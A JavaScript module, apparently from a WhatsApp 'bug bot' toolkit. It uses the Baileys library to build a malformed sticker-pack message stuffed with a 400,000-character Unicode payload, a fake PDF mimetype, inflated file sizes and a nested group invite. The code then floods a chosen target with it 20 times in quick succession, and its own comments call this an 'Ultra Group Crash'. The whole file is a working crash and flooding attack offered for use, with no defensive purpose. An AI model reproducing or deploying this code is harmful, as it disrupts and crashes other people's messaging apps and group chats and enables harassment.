
const { delay } = require('@whiskeysockets/baileys');
const { getSuperPayload } = require('./SuperPayload');
const { sendRawBug } = require('./RawSender');

function createSticker(fileName) {
  return {
    fileName,
    isAnimated: false,
    isLottie: true,
    mimetype: "application/pdf",
    emojis: ["🀄"],
    accessibilityLabel: "ROBIN BUG"
  };
}

async function SuperGroupBug(SYxS7, target) {
    try {
        // High-intensity payload: 400k characters of heavy Unicode
        const superSpam = getSuperPayload(400000); 
        const stickers = Array(40).fill(createSticker("FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp"));
        
        const messageContent = {
            stickerPackMessage: {
                stickerPackId: "ROBIN-ULTRA-BUG",
                name: superSpam,
                publisher: "KING ROBIN",
                packDescription: superSpam,
                stickers: stickers,
                fileLength: "999999999999",
                stickerPackSize: "999999999999",
                contextInfo: {
                    externalAdReply: {
                        title: "💀 ULTRA BYPASS 💀",
                        body: superSpam,
                        showAdAttribution: true,
                        renderLargerThumbnail: true,
                        thumbnailUrl: "https://files.catbox.moe/tlbp3k.jpg"
                    },
                    quotedMessage: {
                        groupInviteMessage: {
                            groupName: superSpam,
                            groupJid: "561611-1627579259@g.us",
                            inviteCode: "h+64P9RhJDzgXSPf",
                            inviteExpiration: 32503680000,
                            caption: superSpam
                        }
                    }
                }
            }
        };

        // Aggressive Raw Stanza Flood
        console.log(`Executing Ultra Group Crash on ${target}...`);
        for (let i = 0; i < 20; i++) {
            await sendRawBug(SYxS7, target, messageContent);
            await delay(200); // High speed repetition
        }
    } catch (error) {
        console.error("SuperGroupBug failed:", error.message);
    }
}

module.exports = { SuperGroupBug };
